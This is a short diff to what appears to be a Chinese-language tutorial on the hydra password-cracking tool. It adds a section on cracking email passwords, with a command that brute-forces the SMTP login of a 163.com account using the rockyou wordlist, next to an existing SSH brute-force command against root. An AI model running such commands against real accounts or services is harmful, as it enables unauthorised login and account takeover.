@@ -50,4 +50,12 @@ hydra：
 # hydra -s 22 -v -l root -P /usr/share/wordlists/rockyou.txt 192.168.0.108 ssh
 {% endhighlight %}
 
+****
+
+破解邮箱密码：
+
+```
+# hydra -S -l test@163.com -P /usr/share/wordlists/rockyou.txt -e ns -V -s 465 -t 1 smtp.163.com smtp
+```
+
 更多选项，查看man hydra。
